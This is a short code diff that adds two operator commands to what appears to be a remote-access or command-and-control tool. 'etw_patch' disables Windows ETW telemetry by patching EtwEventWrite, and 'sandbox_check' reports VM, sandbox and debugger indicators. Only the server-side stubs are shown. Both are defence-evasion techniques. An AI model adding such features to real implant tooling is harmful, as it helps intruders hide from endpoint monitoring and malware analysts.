@@ -153,6 +153,20 @@ def cmd_shell(session: Session, args: list[str]) -> CommandResult:
     return _ok(recv_msg(session.conn))
 
 
+@_cmd("etw_patch", usage="etw_patch",
+      help_text="Patch EtwEventWrite to RET — disables ETW telemetry for this process (Windows)")
+def cmd_etw_patch(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "etw_patch")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("sandbox_check", usage="sandbox_check",
+      help_text="Report sandbox/VM indicators: CPU count, disk size, uptime, hostname, debugger, mouse")
+def cmd_sandbox_check(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "sandbox_check")
+    return _ok(recv_msg(session.conn))
+
+
 # ---------------------------------------------------------------------------
 # File transfer — uses the binary length-prefix protocol, not shell
 # ---------------------------------------------------------------------------
